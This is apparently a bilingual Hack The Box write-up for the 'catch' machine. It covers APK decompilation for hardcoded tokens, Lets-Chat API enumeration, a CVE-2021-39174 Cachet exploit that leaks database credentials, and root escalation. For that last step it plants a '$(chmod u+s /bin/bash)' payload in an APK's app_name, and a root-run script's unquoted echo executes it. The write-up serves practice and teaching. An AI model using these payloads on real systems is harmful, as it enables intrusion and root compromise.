@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>catch | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">catch</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed multiple services including a downloadable APK file. By decompiling the APK using <code>apktool</code>, I discovered hardcoded credentials for various services including a Lets-Chat API token and credentials for Cachet status dashboard.</p>
+                    
+                    <p>Using the Lets-Chat API, I enumerated users and chat rooms, finding credentials for the user <code>john</code> to access the Cachet service. The Cachet instance was running version 2.4.0-dev, which is vulnerable to CVE-2021-39174, allowing configuration file manipulation and information disclosure.</p>
+                    
+                    <p>Exploiting this vulnerability, I leaked database credentials for the user <code>will</code>, which were also valid for SSH access. Once inside, I discovered a scheduled task running as root that processed APK files from <code>/opt/mdm/apk_bin/</code> using a bash script vulnerable to command injection through unsanitized <code>echo</code> statements.</p>
+                    
+                    <p>By modifying the APK's <code>strings.xml</code> file to inject a malicious payload using command substitution syntax, I achieved command execution as root and set the SUID bit on <code>/bin/bash</code>, gaining root access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> APK decompilation with apktool, Lets-Chat API enumeration, Cachet CVE-2021-39174 information disclosure, APK recompilation, bash command injection via variable expansion.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <pre><code class="language-bash">nmap -sC -sV -p- catch.htb</code></pre>
+
+                <p>The scan reveals several interesting services running on the target:</p>
+                <ul>
+                    <li><strong>Port 22:</strong> SSH service</li>
+                    <li><strong>Port 80:</strong> HTTP server with Apache reverse proxy</li>
+                    <li><strong>Port 3000:</strong> Gitea git service</li>
+                    <li><strong>Port 5000:</strong> Lets-Chat application (<a href="https://github.com/sdelements/lets-chat">https://github.com/sdelements/lets-chat</a>)</li>
+                    <li><strong>Port 8000:</strong> Cachet status page system (<a href="https://cachethq.io/">https://cachethq.io/</a>)</li>
+                </ul>
+
+                <h2>Web Enumeration - APK Analysis</h2>
+                <p>For the Gitea service, there's no public repository visible and I don't have credentials yet, so I move on to other services.</p>
+
+                <p>Navigating to the web server on port 80, I find an Android APK file available for download. I download it and decompile it using <code>apktool</code>:</p>
+                <pre><code class="language-bash">apktool d catchv1.0.apk</code></pre>
+
+                <h3>Discovering Virtual Hosts</h3>
+                <p>While analyzing the decompiled APK, I find an interesting string in one of the activity files:</p>
+                <pre><code class="language-java">const-string v0, "https://status.catch.htb/"</code></pre>
+
+                <p>This reveals a virtual host that I add to my <code>/etc/hosts</code> file. However, browsing to <code>status.catch.htb</code> doesn't immediately reveal anything useful.</p>
+
+                <h3>Extracting Hardcoded Credentials</h3>
+                <p>In the <code>strings.xml</code> file, I discover several hardcoded API tokens:</p>
+                <pre><code class="language-xml">&lt;string name="gitea_token"&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;
+&lt;string name="lets_chat_token"&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;
+&lt;string name="slack_token"&gt;xoxp-23984754863-2348975623103&lt;/string&gt;</code></pre>
+
+                <p>The Gitea token doesn't appear to be a session token; the format resembles more of a git commit hash. However, the Lets-Chat token looks like Base64-encoded credentials using Basic authentication format.</p>
+
+                <p>Decoding the Lets-Chat token:</p>
+                <pre><code class="language-bash">echo "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | base64 -d</code></pre>
+
+                <p>This reveals:</p>
+                <pre><code class="language-plaintext">61b86aead984e2451036eb16:d588468ff8bae446379a57fa2b4e63a2368224336b5949c5</code></pre>
+
+                <p>The Slack token cannot be used anywhere at this moment, so I focus on the Lets-Chat service.</p>
+
+                <h2>Lets-Chat API Enumeration</h2>
+                <p>I find the Lets-Chat API documentation here: <a href="https://github.com/sdelements/lets-chat/wiki/API">https://github.com/sdelements/lets-chat/wiki/API</a></p>
+
+                <p>After some trial and error with different authentication methods, I successfully query the API and discover 5 users in the <code>GET /users</code> endpoint:</p>
+                <pre><code class="language-bash">curl -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/users | jq</code></pre>
+
+                <p>The users discovered are: <code>admin</code>, <code>john</code>, <code>will</code>, and <code>lucas</code>. Each user belongs to different chat rooms identified by their IDs.</p>
+
+                <h3>Extracting Information from Chat Rooms</h3>
+                <p>I retrieve information about the rooms and their relevant messages:</p>
+
+                <p><strong>Room ID: 61b86b28d984e2451036eb17</strong></p>
+                <ul>
+                    <li>Slug: <code>status</code></li>
+                    <li>Name: <code>Status</code></li>
+                    <li>Description: <code>Cachet Updates and Maintenance</code></li>
+                </ul>
+                <p>Important messages found:</p>
+                <pre><code class="language-plaintext">"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me."
+"Here are the credentials `john : E}V!mywu_69T4C}W`"</code></pre>
+
+                <p><strong>Room ID: 61b86b3fd984e2451036eb18</strong></p>
+                <ul>
+                    <li>Slug: <code>employees</code></li>
+                    <li>Name: <code>Employees</code></li>
+                    <li>Description: <code>New Joinees, Org updates</code></li>
+                </ul>
+                <p>Messages reveal:</p>
+                <pre><code class="language-plaintext">"Join me in welcoming our new employee Will Robinson who's working as iOS Developer with John Team"
+"Please welcome our new IT Admin - Lucas, a crucial role that will help Catch's revenue and will contribute to the overall profitability of the company!"</code></pre>
+
+                <p><strong>Room ID: 61b8708efe190b466d476bfb</strong></p>
+                <ul>
+                    <li>Slug: <code>android_dev</code></li>
+                    <li>Name: <code>Android Development</code></li>
+                    <li>Description: <code>Android App Updates, Issues & More</code></li>
+                </ul>
+
+                <h2>Accessing Cachet Service</h2>
+                <p>I test the discovered credentials (<code>john:E}V!mywu_69T4C}W</code>) on various services: Gitea, SSH, and Lets-Chat, but they don't work. However, they successfully authenticate on the Cachet service running on port 8000.</p>
+
+                <p>After logging in, I identify the running version: <strong>Cachet 2.4.0-dev</strong>. This appears to be a relatively fresh installation with minimal configuration and data.</p>
+
+                <h2>Exploiting Cachet - CVE-2021-39174</h2>
+                <p>Searching for vulnerabilities affecting this specific version, I find CVE-2021-39174, which allows for Laravel configuration injection. I discover this excellent article explaining the vulnerability: <a href="https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/">https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/</a></p>
+
+                <p>I also locate a proof-of-concept exploit: <a href="https://github.com/hadrian3689/cachet_2.4.0-dev/blob/master/cachet_2.4.0-dev.py">https://github.com/hadrian3689/cachet_2.4.0-dev/blob/master/cachet_2.4.0-dev.py</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>There are two different exploits that abuse the same underlying issue: the ability to write to the <code>.env</code> configuration file. One exploit is an information leak, and the other achieves RCE through PHP deserialization.</p>
+
+                <p>I decide to use the information disclosure exploit to leak sensitive configuration data:</p>
+                <pre><code class="language-bash">python3 xd.py -t http://catch.htb:8000 -u john -p 'E}V!mywu_69T4C}W' -lhost 10.10.16.2 -lport 443</code></pre>
+
+                <p>The exploit successfully executes:</p>
+                <pre><code class="language-plaintext">CVE-2021-39174 Cachet 2.4.0-dev Information Disclosure
+Getting XSRF token:
+Token Found: Hx59Xo6MIKa9ThJ4j4ISp9Kk5mtxMIXAoQnSNydj
+Loggin in
+Logged in!
+Changing Mail Settings
+Waiting 3 seconds:
+Getting Data:</code></pre>
+
+                <p>The exploit reveals sensitive database credentials:</p>
+                <pre><code class="language-plaintext">App Key: base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
+Database Host: localhost
+Database: cachet
+Database Username: will
+Database Password: s2#4Fg0_%3!</code></pre>
+
+                <h2>Initial Access via SSH</h2>
+                <p>I test the leaked credentials (<code>will:s2#4Fg0_%3!</code>) on Gitea and Lets-Chat with no success. However, they work for SSH authentication, granting me access as the <code>will</code> user.</p>
+
+                <p>Once inside, I perform initial enumeration and notice multiple ports open starting from 6000, with Docker listening on <code>172.17.0.1</code>, but nothing immediately catches my attention.</p>
+
+                <h2>Process Monitoring with pspy</h2>
+                <p>After some manual enumeration, I decide to upload <code>pspy64</code> to monitor processes being executed on the system. This reveals that root is periodically executing these commands:</p>
+                <pre><code class="language-bash">UID=0 PID=22955 | /bin/sh -c rm -rf /root/mdm/certified_apps/*
+UID=0 PID=22957 | /bin/bash /opt/mdm/verify.sh
+UID=0 PID=22959 | /bin/bash /opt/mdm/verify.sh
+UID=0 PID=22960 | openssl rand -hex 12
+UID=0 PID=22962 | jarsigner -verify /root/mdm/apk_bin/3feb1e3cc092e72942ddd0ea.apk
+UID=0 PID=22980 | /bin/bash /opt/mdm/verify.sh
+UID=0 PID=22981 | rm -rf /opt/mdm/apk_bin/* /root/mdm/apk_bin/*
+UID=0 PID=22985 | /bin/bash /opt/mdm/verify.sh</code></pre>
+
+                <p>The <code>/opt/mdm/verify.sh</code> script stands out as particularly interesting.</p>
+
+                <h2>Analyzing the verify.sh Script</h2>
+                <p>Reviewing the script contents, I understand that the workflow is:</p>
+                <ol>
+                    <li>Place an APK file in <code>/opt/mdm/apk_bin/</code></li>
+                    <li>The script processes the APK as root</li>
+                    <li>Look for a way to inject commands during processing</li>
+                </ol>
+
+                <p>Initially, I focus on the APK filename but don't find viable injection points. However, I discover a vulnerable pattern in how the script extracts and uses the app name:</p>
+                <pre><code class="language-bash">APP_NAME=$(grep -oPm1 "(?<=&lt;string name=\"app_name\"&gt;)[^&lt;]+" "$1/res/values/strings.xml")
+echo $APP_NAME</code></pre>
+
+                <p>This code uses <code>grep</code> to extract the <code>app_name</code> value from the APK's <code>strings.xml</code> file, then executes an unsafe <code>echo</code> statement. The lack of proper quoting means I can use command substitution with the syntax <code>$(command)</code> to execute arbitrary commands.</p>
+
+                <p>To exploit this, I'll need to modify an APK file and inject my payload into the app_name field.</p>
+
+                <h2>Privilege Escalation - APK Modification</h2>
+                <p>I follow this process to decompile and recompile the APK, based on this guide: <a href="https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82">https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82</a></p>
+
+                <p>I use the Apktool Java tool to decompile and recompile APK files: <a href="https://github.com/iBotPeaches/Apktool/releases">https://github.com/iBotPeaches/Apktool/releases</a></p>
+
+                <h3>Decompiling the APK</h3>
+                <pre><code class="language-bash">java -jar apktool_2.12.1.jar d catchv1.0.apk -o decomp</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">I: Using Apktool 2.12.1 on catchv1.0.apk with 6 threads
+I: Baksmaling classes.dex...
+I: Loading resource table...
+I: Decoding file-resources...
+I: Loading resource table from file: /home/asd/.local/share/apktool/framework/1.apk
+I: Decoding values */* XMLs...
+I: Decoding AndroidManifest.xml with resources...
+I: Copying original files...
+I: Copying unknown files...</code></pre>
+
+                <h3>Testing Recompilation</h3>
+                <p>Before modifying anything, I test that I can successfully recompile the APK:</p>
+                <pre><code class="language-bash">java -jar apktool_2.12.1.jar b -f decomp/ -o test.apk</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">I: Using Apktool 2.12.1 on catchv1.0.apk with 6 threads
+I: Smaling smali folder into classes.dex...
+I: Building resources with aapt2...
+I: Building apk file...
+I: Importing unknown files...
+I: Built apk into: test.apk</code></pre>
+
+                <p>The recompilation works successfully.</p>
+
+                <h3>Injecting the Malicious Payload</h3>
+                <p>Now I modify the <code>app_name</code> value in the <code>res/values/strings.xml</code> file within the decompiled APK structure:</p>
+                <pre><code class="language-xml">&lt;string name="app_name"&gt;$(chmod u+s /bin/bash)&lt;/string&gt;</code></pre>
+
+                <p>This payload will set the SUID bit on <code>/bin/bash</code> when executed by root, allowing me to spawn a root shell.</p>
+
+                <p>I recompile the APK with this modified value and name it <code>xd.apk</code>.</p>
+
+                <h3>Triggering the Exploit</h3>
+                <p>I transfer the malicious APK to the directory where the script will process it:</p>
+                <pre><code class="language-bash">cd /opt/mdm/apk_bin
+wget 10.10.16.2:8000/xd.apk</code></pre>
+
+                <p>The download completes successfully:</p>
+                <pre><code class="language-plaintext">Connecting to 10.10.16.2:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2735789 (2.6M) [application/vnd.android.package-archive]
+Saving to: 'xd.apk'
+
+xd.apk 100% [============>] 2.61M 1.60MB/s in 1.6s
+
+'xd.apk' saved [2735789/2735789]</code></pre>
+
+                <p>The scheduled task executes the <code>verify.sh</code> script, which processes my malicious APK. The command injection in the <code>app_name</code> field executes successfully, setting the SUID bit on <code>/bin/bash</code>.</p>
+
+                <p>Now I can spawn a root shell:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <p>This grants me root access to the system, allowing me to retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo exponía múltiples servicios incluyendo un archivo APK descargable. Al decompilar el APK usando <code>apktool</code>, descubrí credenciales hardcodeadas para varios servicios incluyendo un token API de Lets-Chat y credenciales para el panel de estado Cachet.</p>
+                    
+                    <p>Utilizando la API de Lets-Chat, enumeré usuarios y salas de chat, encontrando credenciales para el usuario <code>john</code> para acceder al servicio Cachet. La instancia de Cachet ejecutaba la versión 2.4.0-dev, vulnerable a CVE-2021-39174, permitiendo manipulación de archivos de configuración y divulgación de información.</p>
+                    
+                    <p>Explotando esta vulnerabilidad, filtré credenciales de base de datos para el usuario <code>will</code>, que también eran válidas para acceso SSH. Una vez dentro, descubrí una tarea programada ejecutándose como root que procesaba archivos APK desde <code>/opt/mdm/apk_bin/</code> usando un script bash vulnerable a inyección de comandos a través de sentencias <code>echo</code> sin sanitizar.</p>
+                    
+                    <p>Modificando el archivo <code>strings.xml</code> del APK para inyectar un payload malicioso usando sintaxis de sustitución de comandos, conseguí ejecución de comandos como root y establecí el bit SUID en <code>/bin/bash</code>, obteniendo acceso root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Decompilación APK con apktool, enumeración API Lets-Chat, Cachet CVE-2021-39174 divulgación de información, recompilación APK, inyección de comandos bash mediante expansión de variables.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <pre><code class="language-bash">nmap -sC -sV -p- catch.htb</code></pre>
+
+                <p>El escaneo revela varios servicios interesantes ejecutándose en el objetivo:</p>
+                <ul>
+                    <li><strong>Puerto 22:</strong> Servicio SSH</li>
+                    <li><strong>Puerto 80:</strong> Servidor HTTP con proxy inverso Apache</li>
+                    <li><strong>Puerto 3000:</strong> Servicio git Gitea</li>
+                    <li><strong>Puerto 5000:</strong> Aplicación Lets-Chat (<a href="https://github.com/sdelements/lets-chat">https://github.com/sdelements/lets-chat</a>)</li>
+                    <li><strong>Puerto 8000:</strong> Sistema de página de estado Cachet (<a href="https://cachethq.io/">https://cachethq.io/</a>)</li>
+                </ul>
+
+                <h2>Enumeración Web - Análisis APK</h2>
+                <p>Para el servicio Gitea, no hay ningún repositorio público visible y no tengo credenciales todavía, así que paso a otros servicios.</p>
+
+                <p>Navegando al servidor web en el puerto 80, encuentro un archivo APK de Android disponible para descarga. Lo descargo y lo descompilo usando <code>apktool</code>:</p>
+                <pre><code class="language-bash">apktool d catchv1.0.apk</code></pre>
+
+                <h3>Descubriendo Virtual Hosts</h3>
+                <p>Mientras analizo el APK descompilado, encuentro una cadena interesante en uno de los archivos de actividad:</p>
+                <pre><code class="language-java">const-string v0, "https://status.catch.htb/"</code></pre>
+
+                <p>Esto revela un virtual host que añado a mi archivo <code>/etc/hosts</code>. Sin embargo, navegar a <code>status.catch.htb</code> no revela inmediatamente nada útil.</p>
+
+                <h3>Extrayendo Credenciales Hardcodeadas</h3>
+                <p>En el archivo <code>strings.xml</code>, descubro varios tokens API hardcodeados:</p>
+                <pre><code class="language-xml">&lt;string name="gitea_token"&gt;b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0&lt;/string&gt;
+&lt;string name="lets_chat_token"&gt;NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&lt;/string&gt;
+&lt;string name="slack_token"&gt;xoxp-23984754863-2348975623103&lt;/string&gt;</code></pre>
+
+                <p>El token de Gitea no parece ser un token de sesión; el formato se parece más a un hash de commit git. Sin embargo, el token de Lets-Chat parece credenciales codificadas en Base64 usando formato de autenticación Basic.</p>
+
+                <p>Decodificando el token de Lets-Chat:</p>
+                <pre><code class="language-bash">echo "NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | base64 -d</code></pre>
+
+                <p>Esto revela:</p>
+                <pre><code class="language-plaintext">61b86aead984e2451036eb16:d588468ff8bae446379a57fa2b4e63a2368224336b5949c5</code></pre>
+
+                <p>El token de Slack no puede usarse en ningún sitio en este momento, así que me centro en el servicio Lets-Chat.</p>
+
+                <h2>Enumeración API Lets-Chat</h2>
+                <p>Encuentro la documentación de la API de Lets-Chat aquí: <a href="https://github.com/sdelements/lets-chat/wiki/API">https://github.com/sdelements/lets-chat/wiki/API</a></p>
+
+                <p>Tras algunas pruebas con diferentes métodos de autenticación, consigo consultar la API exitosamente y descubro 5 usuarios en el endpoint <code>GET /users</code>:</p>
+                <pre><code class="language-bash">curl -H "Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" http://catch.htb:5000/users | jq</code></pre>
+
+                <p>Los usuarios descubiertos son: <code>admin</code>, <code>john</code>, <code>will</code>, y <code>lucas</code>. Cada usuario pertenece a diferentes salas de chat identificadas por sus IDs.</p>
+
+                <h3>Extrayendo Información de las Salas de Chat</h3>
+                <p>Recupero información sobre las salas y sus mensajes relevantes:</p>
+
+                <p><strong>ID de Sala: 61b86b28d984e2451036eb17</strong></p>
+                <ul>
+                    <li>Slug: <code>status</code></li>
+                    <li>Nombre: <code>Status</code></li>
+                    <li>Descripción: <code>Cachet Updates and Maintenance</code></li>
+                </ul>
+                <p>Mensajes importantes encontrados:</p>
+                <pre><code class="language-plaintext">"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me."
+"Here are the credentials `john : E}V!mywu_69T4C}W`"</code></pre>
+
+                <p><strong>ID de Sala: 61b86b3fd984e2451036eb18</strong></p>
+                <ul>
+                    <li>Slug: <code>employees</code></li>
+                    <li>Nombre: <code>Employees</code></li>
+                    <li>Descripción: <code>New Joinees, Org updates</code></li>
+                </ul>
+                <p>Los mensajes revelan:</p>
+                <pre><code class="language-plaintext">"Join me in welcoming our new employee Will Robinson who's working as iOS Developer with John Team"
+"Please welcome our new IT Admin - Lucas, a crucial role that will help Catch's revenue and will contribute to the overall profitability of the company!"</code></pre>
+
+                <p><strong>ID de Sala: 61b8708efe190b466d476bfb</strong></p>
+                <ul>
+                    <li>Slug: <code>android_dev</code></li>
+                    <li>Nombre: <code>Android Development</code></li>
+                    <li>Descripción: <code>Android App Updates, Issues & More</code></li>
+                </ul>
+
+                <h2>Accediendo al Servicio Cachet</h2>
+                <p>Pruebo las credenciales descubiertas (<code>john:E}V!mywu_69T4C}W</code>) en varios servicios: Gitea, SSH, y Lets-Chat, pero no funcionan. Sin embargo, autentican exitosamente en el servicio Cachet ejecutándose en el puerto 8000.</p>
+
+                <p>Tras iniciar sesión, identifico la versión en ejecución: <strong>Cachet 2.4.0-dev</strong>. Esto parece ser una instalación relativamente reciente con mínima configuración y datos.</p>
+
+                <h2>Explotando Cachet - CVE-2021-39174</h2>
+                <p>Buscando vulnerabilidades que afecten a esta versión específica, encuentro CVE-2021-39174, que permite inyección de configuración Laravel. Descubro este excelente artículo explicando la vulnerabilidad: <a href="https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/">https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/</a></p>
+
+                <p>También localizo una prueba de concepto del exploit: <a href="https://github.com/hadrian3689/cachet_2.4.0-dev/blob/master/cachet_2.4.0-dev.py">https://github.com/hadrian3689/cachet_2.4.0-dev/blob/master/cachet_2.4.0-dev.py</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>Hay dos exploits diferentes que abusan del mismo problema subyacente: la capacidad de escribir en el archivo de configuración <code>.env</code>. Un exploit es una filtración de información, y el otro consigue RCE mediante deserialización PHP.</p>
+
+                <p>Decido usar el exploit de divulgación de información para filtrar datos de configuración sensibles:</p>
+                <pre><code class="language-bash">python3 xd.py -t http://catch.htb:8000 -u john -p 'E}V!mywu_69T4C}W' -lhost 10.10.16.2 -lport 443</code></pre>
+
+                <p>El exploit se ejecuta exitosamente:</p>
+                <pre><code class="language-plaintext">CVE-2021-39174 Cachet 2.4.0-dev Information Disclosure
+Getting XSRF token:
+Token Found: Hx59Xo6MIKa9ThJ4j4ISp9Kk5mtxMIXAoQnSNydj
+Loggin in
+Logged in!
+Changing Mail Settings
+Waiting 3 seconds:
+Getting Data:</code></pre>
+
+                <p>El exploit revela credenciales sensibles de base de datos:</p>
+                <pre><code class="language-plaintext">App Key: base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=
+Database Host: localhost
+Database: cachet
+Database Username: will
+Database Password: s2#4Fg0_%3!</code></pre>
+
+                <h2>Acceso Inicial vía SSH</h2>
+                <p>Pruebo las credenciales filtradas (<code>will:s2#4Fg0_%3!</code>) en Gitea y Lets-Chat sin éxito. Sin embargo, funcionan para autenticación SSH, otorgándome acceso como usuario <code>will</code>.</p>
+
+                <p>Una vez dentro, realizo enumeración inicial y noto múltiples puertos abiertos empezando desde el 6000, con Docker escuchando en <code>172.17.0.1</code>, pero nada me llama inmediatamente la atención.</p>
+
+                <h2>Monitorización de Procesos con pspy</h2>
+                <p>Tras alguna enumeración manual, decido subir <code>pspy64</code> para monitorizar procesos ejecutándose en el sistema. Esto revela que root está ejecutando periódicamente estos comandos:</p>
+                <pre><code class="language-bash">UID=0 PID=22955 | /bin/sh -c rm -rf /root/mdm/certified_apps/*
+UID=0 PID=22957 | /bin/bash /opt/mdm/verify.sh
+UID=0 PID=22959 | /bin/bash /opt/mdm/verify.sh
+UID=0 PID=22960 | openssl rand -hex 12
+UID=0 PID=22962 | jarsigner -verify /root/mdm/apk_bin/3feb1e3cc092e72942ddd0ea.apk
+UID=0 PID=22980 | /bin/bash /opt/mdm/verify.sh
+UID=0 PID=22981 | rm -rf /opt/mdm/apk_bin/* /root/mdm/apk_bin/*
+UID=0 PID=22985 | /bin/bash /opt/mdm/verify.sh</code></pre>
+
+                <p>El script <code>/opt/mdm/verify.sh</code> destaca como particularmente interesante.</p>
+
+                <h2>Analizando el Script verify.sh</h2>
+                <p>Revisando los contenidos del script, entiendo que el flujo de trabajo es:</p>
+                <ol>
+                    <li>Colocar un archivo APK en <code>/opt/mdm/apk_bin/</code></li>
+                    <li>El script procesa el APK como root</li>
+                    <li>Buscar una manera de inyectar comandos durante el procesamiento</li>
+                </ol>
+
+                <p>Inicialmente, me centro en el nombre del archivo APK pero no encuentro puntos de inyección viables. Sin embargo, descubro un patrón vulnerable en cómo el script extrae y usa el nombre de la app:</p>
+                <pre><code class="language-bash">APP_NAME=$(grep -oPm1 "(?<=&lt;string name=\"app_name\"&gt;)[^&lt;]+" "$1/res/values/strings.xml")
+echo $APP_NAME</code></pre>
+
+                <p>Este código usa <code>grep</code> para extraer el valor <code>app_name</code> del archivo <code>strings.xml</code> del APK, luego ejecuta una sentencia <code>echo</code> insegura. La falta de entrecomillado apropiado significa que puedo usar sustitución de comandos con la sintaxis <code>$(comando)</code> para ejecutar comandos arbitrarios.</p>
+
+                <p>Para explotar esto, necesitaré modificar un archivo APK e inyectar mi payload en el campo app_name.</p>
+
+                <h2>Escalada de Privilegios - Modificación APK</h2>
+                <p>Sigo este proceso para decompilar y recompilar el APK, basándome en esta guía: <a href="https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82">https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82</a></p>
+
+                <p>Uso la herramienta Java Apktool para decompilar y recompilar archivos APK: <a href="https://github.com/iBotPeaches/Apktool/releases">https://github.com/iBotPeaches/Apktool/releases</a></p>
+
+                <h3>Decompilando el APK</h3>
+                <pre><code class="language-bash">java -jar apktool_2.12.1.jar d catchv1.0.apk -o decomp</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">I: Using Apktool 2.12.1 on catchv1.0.apk with 6 threads
+I: Baksmaling classes.dex...
+I: Loading resource table...
+I: Decoding file-resources...
+I: Loading resource table from file: /home/asd/.local/share/apktool/framework/1.apk
+I: Decoding values */* XMLs...
+I: Decoding AndroidManifest.xml with resources...
+I: Copying original files...
+I: Copying unknown files...</code></pre>
+
+                <h3>Probando la Recompilación</h3>
+                <p>Antes de modificar nada, pruebo que puedo recompilar exitosamente el APK:</p>
+                <pre><code class="language-bash">java -jar apktool_2.12.1.jar b -f decomp/ -o test.apk</code></pre>
+
+                <p>Salida:</p>
+                <pre><code class="language-plaintext">I: Using Apktool 2.12.1 on catchv1.0.apk with 6 threads
+I: Smaling smali folder into classes.dex...
+I: Building resources with aapt2...
+I: Building apk file...
+I: Importing unknown files...
+I: Built apk into: test.apk</code></pre>
+
+                <p>La recompilación funciona exitosamente.</p>
+
+                <h3>Inyectando el Payload Malicioso</h3>
+                <p>Ahora modifico el valor <code>app_name</code> en el archivo <code>res/values/strings.xml</code> dentro de la estructura del APK descompilado:</p>
+                <pre><code class="language-xml">&lt;string name="app_name"&gt;$(chmod u+s /bin/bash)&lt;/string&gt;</code></pre>
+
+                <p>Este payload establecerá el bit SUID en <code>/bin/bash</code> cuando se ejecute como root, permitiéndome spawnear una shell root.</p>
+
+                <p>Recompilo el APK con este valor modificado y lo nombro <code>xd.apk</code>.</p>
+
+                <h3>Desencadenando el Exploit</h3>
+                <p>Transfiero el APK malicioso al directorio donde el script lo procesará:</p>
+                <pre><code class="language-bash">cd /opt/mdm/apk_bin
+wget 10.10.16.2:8000/xd.apk</code></pre>
+
+                <p>La descarga se completa exitosamente:</p>
+                <pre><code class="language-plaintext">Connecting to 10.10.16.2:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2735789 (2.6M) [application/vnd.android.package-archive]
+Saving to: 'xd.apk'
+
+xd.apk 100% [============>] 2.61M 1.60MB/s in 1.6s
+
+'xd.apk' saved [2735789/2735789]</code></pre>
+
+                <p>La tarea programada ejecuta el script <code>verify.sh</code>, que procesa mi APK malicioso. La inyección de comandos en el campo <code>app_name</code> se ejecuta exitosamente, estableciendo el bit SUID en <code>/bin/bash</code>.</p>
+
+                <p>Ahora puedo spawnear una shell root:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <p>Esto me otorga acceso root al sistema, permitiéndome recuperar la flag de root y completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
